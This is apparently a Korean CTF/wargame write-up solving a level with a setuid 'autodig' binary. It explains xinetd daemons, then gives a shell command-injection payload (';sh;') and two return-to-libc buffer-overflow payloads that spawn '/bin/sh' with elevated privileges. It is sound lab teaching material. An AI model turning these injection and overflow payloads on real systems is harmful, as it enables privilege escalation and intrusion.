## LEVEL 9



1. hint

   ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1578892627599.png)



2. `/etc/xinetd.d`에서 backdoor 파일 확인

   ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572942324076.png)



------



#### 개념 이해



1. Daemon (데몬)

   > 시스템에 관련된 작업을 수행하는 background process를 통칭하는 용어

   - 특징
     - 부팅 단계부터 지정된 daemon 동작
     - 서비스의 요청이 없는 경우에는 유휴(idle) 상태를 유지함
     - 기본적인 시스템 resource를 소모



- Stand alone 방식

  - 각 service daemon이 항상 standby하고 있다가 service 요청이 오면 바로 작동

  - 자주 사용되는 service에 사용

    > ex) httpd, sshd ...

- Xinetd 방식

  > eXtended InterNET service Daemon

  - Internet Super Daemon이 다른 daemon들을 관리하는 형태

  - Super daemon만 standby하고 있다가 service 요청이 들어오면 해당 service 프로그램을 실행 시킴

    - 네트워크 접속 제어 역할 수행
    - 특정 service daemon 대신 client가 연결을 하면 연결을 받아들이는 역할

  - 자주 사용하지 않는 service에 사용

    > ex) telnet ...

   

------



#### 취약점 공략



1. 환경 변수 - PATH

   `echo $PATH`

   ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572590486253.png)

   - `/bin` 이 환경 변수 PATH에 지정되어 있으므로 `/bin`에 있는 파일은 이름만으로 실행 가능

     

2. file (`autodig`) 실행

   - parameter를 쓰지 않은 경우

     `autodig`

     ![1572590586521](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572590586521.png)

     ​	→ argc가 2개가 아님 (argc = 1)

     

   - parameter를 잘못 쓴 경우

     `autodig 168.126.63.1 www.naver.com`

     ![1572590737920](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572590737920.png)

     ​	→ argc가 2개가 아님 (argc = 3)

     

   - parameter를 " "로 감싸준 경우

     `autodig "168.126.63.1 www.naver.com"`

     ![1572591403173](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572591403173.png)

     ​	→ argc = 2

     ​	→ `dig @168.126.63.1 naver.com` 가 실행됨



3. 첫번째 공격

   > ; 를 이용한 공격

   - `;`, `&&` : 명령어를 자동으로 이어서 실행 가능 (앞 명령어가 끝나면 뒷 명령어가 실행되는 방식)

     - `pwd; id; ls -ld /etc`

       ![1572668178064](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668178064.png)

       ​	→ `pwd`, `id`, `ls -ld /etc` 명령어를 차례로 실행

       

     - `pwddd; id; ls -ld /etc`

       ![1572668385934](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668385934.png)

       ​	→ `;` 를 이용한 명령어는 앞 명령어가 틀려도 뒷 명령어 실행 가능

       

     - `pwd && id && ls -ld /etc`

       ![1572668279714](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668279714.png)

       ​	→ `pwd`, `id`, `ls -ld /etc` 명령어를 차례로 실행

       

     - `pwddd && id &&& ls -ld /etc`

       ![1572668468868](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668468868.png)

       ​	→ `&&` 를 이용한 명령어는 앞 명령어가 틀리면 뒷 명령어 실행 불가능

       

   - `autodig "168.126.63.1 www.naver.com;sh;"`

     ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668846691.png)

     ​	→ `dig 168.126.63.1 www.naver.com;sh; version.bind chaos txt` 를 실행한 결과와 같음

     ​	→ setuid bit가 설정되어 있으므로 `sh`는 level 4의 권한으로 실행된다

     

   - `autodig "168.126.63.1 www.naver.com;my-pass;"`

     ![1572668920547](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668920547.png)

     ​	→ `dig 168.126.63.1 www.naver.com;my-pass; version.bind chaos txt` 를 실행한 결과와 같음

     ​	→ setuid bit가 설정되어 있으므로 `my-pass`는 level 4의 권한으로 실행된다

   

4. 두번째 공격

   > RTL을 이용한 공격

   - RTL(Return To Libc) 

     ​	: stack에 공격 코드인 shell code를 올려놓고 실행하는 기법을 막은걸 우회하는 기법 

     

   - 메모리 구조 분석

     ![1572669094777](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572669094777.png)

   ​	→ 0x78 = 120

   ​	→ 120 = 100 byte + 12 byte (dummy) + 8 byte (dummy)

   ​	⇒	Low                                    								High 
   ​				|-------------- 120 -------------|-- 4 --|-- 4 --| 
   ​				|--- 100  ---|--- 12 ---|--- 8 ---|-- 4 --|-- 4 --|
   ​				+-----------+----------+--------+------+------+
   ​				| cmd[100] | dummy | dummy|  SFP  |  RET  |
   ​				+-----------+----------+--------+------+------+

   

   - RTL 공격에 필요한 변수 준비

     - system() 함수의 주소

       ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572940428687.png)

       

     - "/bin/sh" 문자열의 주소

       - `vi findshell.c` 명령어로 findshell.c 파일 만들기

         ![1572940544315](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572940544315.png)

       - findshell.c 파일 컴파일 및 실행

         ![1572940582569](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572940582569.png)

         

   - 공격 실행

     ```
     autodig `python -c 'print "A"*119+"\xc0\xf2\x03\x42"+"A*4"+"\xa4\x7e\x12\x42"'`
     ```

     ![1572940776853](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572940776853.png)

     - 메모리 구조 분석

       |-------------- 120 -------------|-- 4 --|-- 4 --|-- 4 --|-- 4 --|
       |--- 100  ---|--- 12 ---|--- 8 ---|-- 4 --|-- 4 --|-- 4 --|-- 4 --|
       +-----------+----------+--------+------+------+------+-------+
       | cmd[100] | dummy | dummy|  SFP  |  RET  | argc |argv[1]|
       +-----------+----------+--------+------+------+------+-------+

       |dig @| .......  AAAAAAAAAAAA  ......  |system|AAAA|/bin/sh|

       |-  5  -|-------------- 119 --------------|--- 4 --|-- 4 --|-- 4 --| 

       ​	⇒ `system(/bin/sh)`

       

5. 세번째 공격

   > 환경 변수를 이용한 RTL 공격

   - 환경변수에 "/bin/sh" 문자열 저장

     - `export MYSHELL="/bin/sh"`

       ![1572941394533](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572941394533.png)

     - 환경변수 `MYSHELL` 주소 확인

       - `vi getmyshell.c` 명령어로 getmyshell.c 파일 만들기

         ![1572941635873](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572941635873.png)

       - getmyshell.c 파일 컴파일 및 실행

         ![1572941668858](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572941668858.png)

   

   - 공격 실행

     ```
     autodig `python -c 'print "A"*119+"\xc0\xf2\x03\x42"+"A*4"+"\x6f\xff\xff\xbf"'`
     ```

     ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572941830513.png)

     ​	⇒ `system(/bin/sh)`

